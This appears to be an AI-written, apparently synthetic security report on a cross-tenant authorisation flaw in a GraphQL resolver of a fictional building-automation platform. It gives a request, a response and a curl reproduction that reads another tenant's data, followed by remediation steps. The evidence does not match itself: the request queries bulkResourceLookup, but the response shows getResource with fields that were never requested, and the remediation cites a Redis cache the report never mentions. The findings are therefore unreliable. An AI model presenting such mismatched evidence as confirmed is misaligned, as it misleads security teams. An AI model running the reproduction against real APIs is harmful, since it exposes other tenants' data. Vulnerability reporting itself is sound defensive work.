# Security Analysis Report
**System:** NeoBuild BAS Platform (Smart Home / Building Automation)
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** GQL-0243 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA / Pattern 1.1 | ID in path without ownership check — cross-tenant BAS resource IDs accessible via `bulkResourceLookup` |

---

## Finding 1 — BOLA: Cross-Tenant Building Automation Data via Direct ID Access (CRITICAL)

### Summary
The `bulkResourceLookup` resolver on NeoBuild BAS Platform (`api.neobuild-bas-platfor.example.com`) accepts a list of resource IDs without verifying per-ID tenancy ownership (§4.0 RISK-GQL-243). Per §5.0 Pattern 1.1, this is the foundational BOLA pattern: resource IDs are directly usable as access keys without any ownership check. An attacker with a `tenant-b167` token passes `R-2243`, `R-1243`, `R-3243` (belonging to `tenant-39a0`) and receives BAS (Building Automation System) data — including HVAC configurations, access control states, and sensor data — belonging to the victim tenant.

**Pattern:** 1.1 — ID in path without ownership check (BOLA)
**Affected resolver:** `bulkResourceLookup(ids: [ID!]!): [Resource!]`
**Affected endpoint:** `POST https://api.neobuild-bas-platfor.example.com/graphql`

### Evidence from HAR

**Request (attacker `tenant-b167`):**
```
POST https://api.neobuild-bas-platfor.example.com/graphql HTTP/2.0
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
x-tenant-id: tenant-b167

{"query": "query VulnerableOp { bulkResourceLookup(ids: [\"R-2243\", \"R-1243\", \"R-3243\"]) { resourceId tenantId data { sensitiveField } } }"}
```

**Response (200 OK):**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-39a0",
      "ownerId": "other-user-b16739a0",
      "data": {"sensitiveField": "CONFIDENTIAL-b16739a0", "internalNotes": "Internal data exposed"}
    }
  }
}
```

**x-request-id:** `req-b16739a0`

BAS systems control HVAC, access control, lighting, and security — cross-tenant access exposes building operational configurations, occupancy data, and physical security states.

### Evidence Map
| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 RISK-GQL-243 | Resolver gap | No per-ID `tenantId` check | Root cause |
| §5.0 Pattern 1.1 | Vulnerability | ID direct access without ownership | Classification |
| HAR request | `ids` | `["R-2243","R-1243","R-3243"]` | Victim BAS resource IDs |
| HAR request | `x-tenant-id` | `tenant-b167` | Attacker tenant |
| HAR response | `tenantId` | `tenant-39a0` | Victim confirmed |
| HAR response | `sensitiveField` | `CONFIDENTIAL-b16739a0` | BAS config data |
| HAR headers | `x-request-id` | `req-b16739a0` | Correlation ID |

### Steps to Reproduce
```bash
ATTACKER_JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST https://api.neobuild-bas-platfor.example.com/graphql \
  -H "Authorization: Bearer $ATTACKER_JWT" \
  -H "x-tenant-id: tenant-b167" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { bulkResourceLookup(ids: [\"R-2243\",\"R-1243\",\"R-3243\"]) { resourceId tenantId data { sensitiveField } } }"}' \
  | jq '.data.bulkResourceLookup'
# VULNERABLE: tenant-39a0 BAS data with CONFIDENTIAL-b16739a0
```

### Remediation
1. Per-ID tenancy filter: `return resources.filter(r => r.tenantId === context.auth.tenantId)`
2. Non-guessable BAS resource IDs — replace sequential with UUIDs.
3. Fix Redis cache key with `tenantId`.
4. BAS/Smart Building: physical security states and access control configurations are sensitive — cross-tenant access enables physical intrusion planning.
5. PostgreSQL RLS as defence-in-depth.
